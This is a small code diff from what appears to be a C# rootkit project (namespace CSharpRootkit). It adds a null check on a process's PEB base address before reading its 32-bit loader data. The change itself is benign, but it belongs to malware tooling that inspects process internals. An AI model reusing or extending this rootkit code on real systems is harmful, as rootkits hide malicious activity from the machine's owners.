@@ -27,6 +27,12 @@ namespace CSharpRootkit
             {
                 throw new Exception("couldnt read PBI. ERR CODE: " + errcode);
             }
+
+            if (PBI.PebBaseAddress == IntPtr.Zero) 
+            {
+                return 0;
+            }
+
             IntPtr ldrAddr = InternalStructs32.GetLdr32(PBI.PebBaseAddress);
             int pLdrDataSize = Marshal.SizeOf(typeof(UINTRESULT));
             IntPtr pLdrData = Marshal.AllocHGlobal(pLdrDataSize);
